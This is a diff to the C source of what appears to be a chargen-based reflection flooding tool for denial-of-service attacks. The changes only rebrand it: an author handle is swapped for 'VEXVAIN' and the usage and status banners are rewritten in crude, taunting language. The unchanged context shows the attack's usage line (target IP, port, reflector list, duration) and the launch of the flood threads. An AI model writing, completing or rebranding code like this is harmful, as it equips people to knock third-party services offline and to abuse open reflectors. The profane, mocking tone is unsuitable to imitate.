@@ -1,6 +1,6 @@
 /*
- * made by @flexingonlamers enjoy
- */
+ENJOY :)
+*/
 #include <time.h>
 #include <pthread.h>
 #include <unistd.h>
@@ -131,8 +131,8 @@ void *flood(void *par1)
 int main(int argc, char *argv[ ])
 {
 	if(argc < 6){
-	fprintf(stderr, "\x1b[0;36mMade By @flexingonlamers.. \x1b[1;35m You entered it wrong dumb mf\n");
-	fprintf(stdout, "\x1b[0;36mput this hoe:\x1b[1;35m %s IP PORT chargen.txt 2 -1 TIME\n", argv[0]);
+	fprintf(stderr, "\x1b[1;31mVEXVAIN\x1b[1;37m You entered it wrong dipshit\n");
+	fprintf(stdout, "\x1b[1;34mPut this:\x1b[1;33m %s IP PORT chargen.txt 2 -1 TIME\n", argv[0]);
 		exit(-1);
 	}
 	srand(time(NULL));
@@ -184,7 +184,7 @@ int main(int argc, char *argv[ ])
 		td[i].list_node = current;
 		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
 	}
-	fprintf(stdout, "\x1b[1;35mSmacking that hoe...\n");
+	fprintf(stdout, "\x1b[1;33mSKRR SKRRR...\n");
 	for(i = 0;i<(atoi(argv[6])*multiplier);i++)
 	{
 		usleep((1000/multiplier)*1000);
